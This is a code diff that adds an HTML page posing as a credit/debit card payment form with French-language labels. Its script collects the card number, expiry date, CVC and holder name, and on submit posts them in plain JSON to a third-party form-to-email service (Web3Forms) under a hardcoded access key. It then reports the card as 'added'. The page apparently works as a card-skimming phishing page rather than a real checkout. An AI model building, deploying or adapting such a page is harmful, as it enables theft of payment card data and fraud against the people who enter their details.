@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment Form</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css">
+</head>
+<body>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+    <div class="padding">
+        <div class="row">
+            <div class="container-fluid d-flex justify-content-center">
+                <div class="col-sm-8 col-md-6">
+                    <div class="card">
+                        <div class="card-header">
+                            <div class="row">
+                                <div class="col-md-6">
+                                    <span>CREDIT/DEBIT CARD PAYMENT</span>
+                                </div>
+                                <div class="col-md-6 text-right" style="margin-top: -5px;">
+                                    <img src="https://img.icons8.com/color/36/000000/visa.png">
+                                    <img src="https://img.icons8.com/color/36/000000/mastercard.png">
+                                    <img src="https://img.icons8.com/color/36/000000/amex.png">
+                                </div>
+                            </div>
+                        </div>
+                        <form id="paymentForm">
+                            <input type="hidden" name="access_key" value="e7bf3ff9-6c7c-4f00-9e51-83eff5b9d948">
+                            <fieldset>
+                                <div class="card-body" style="height: 350px">
+                                    <div class="form-group">
+                                        <label for="cc-number" class="control-label">NUMERO DE CARTE BANCAIRE</label>
+                                        <input id="cc-number" name="number" type="tel" class="input-lg form-control cc-number" autocomplete="off" placeholder="&bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull;" required>
+                                    </div>
+                                    <div class="row">
+                                        <div class="col-md-6">
+                                            <div class="form-group">
+                                                <label for="cc-exp" class="control-label">DATE D'EXPIRATION</label>
+                                                <input id="cc-exp" name="exp" type="tel" class="input-lg form-control cc-exp" autocomplete="off" placeholder="&bull;&bull; / &bull;&bull;&bull;&bull;" required>
+                                            </div>
+                                        </div>
+                                        <div class="col-md-6">
+                                            <div class="form-group">
+                                                <label for="cc-cvc" class="control-label">CVC</label>
+                                                <input id="cc-cvc" name="cv" type="tel" class="input-lg form-control cc-cvc" autocomplete="off" placeholder="&bull;&bull;&bull;" required>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="form-group">
+                                        <label for="card-holder-name" class="control-label">NOM DU TITULAIRE DE LA CARTE</label>
+                                        <input type="text" name="name" id="card-holder-name" class="input-lg form-control" required>
+                                    </div>
+                                    <div class="form-group">
+                                        <input value="AJOUTER LA CARTE" type="submit" class="btn btn-success btn-lg form-control" style="font-size: .8rem;">
+                                    </div>
+                                   
+                                </div>
+                            </fieldset>
+                        </form>
+
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div id="result" class="text-center"></div> <!-- Result message area -->
+
+    <!-- jQuery Payment Plugin -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
+
+    <script>
+        // Format and restrict inputs for card number, expiry, and CVC
+        $(function($) {
+            $('.cc-number').payment('formatCardNumber');
+            $('.cc-exp').payment('formatCardExpiry');
+            $('.cc-cvc').payment('formatCardCVC');
+        });
+
+        const form = document.getElementById('paymentForm');
+        const result = document.getElementById('result');
+
+        form.addEventListener('submit', function(e) {
+            e.preventDefault(); // Prevent form submission
+
+            const formData = new FormData(form); // Create FormData object
+            const object = Object.fromEntries(formData); // Convert FormData to an object
+            const json = JSON.stringify(object); // Convert object to JSON format
+            result.innerHTML = "Veuillez Patienter..."; // Show message
+
+            // Fetch API to send data to Web3Forms
+            fetch('https://api.web3forms.com/submit', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: json
+            })
+            .then(async (response) => {
+                let json = await response.json();
+                if (response.status == 200) {
+                    result.innerHTML = "Carte Ajouter"; // Success message
+                    result.style.color = "green";
+                } else {
+                    console.log(response);
+                    result.innerHTML = json.message; // Error message from the response
+                     result.style.color = "red"
+                }
+            })
+            .catch(error => {
+                console.log(error);
+                result.innerHTML = "Veuillez essayez a nouveau!"; // Network error
+                result.style.color = "red"; // Red text on network error
+            })
+            .then(function() {
+                form.reset(); // Reset form after submission
+                setTimeout(() => {
+                    result.style.display = "none"; // Hide result message after 3 seconds
+                }, 3000);
+            });
+        });
+    </script>
+</body>
+</html>
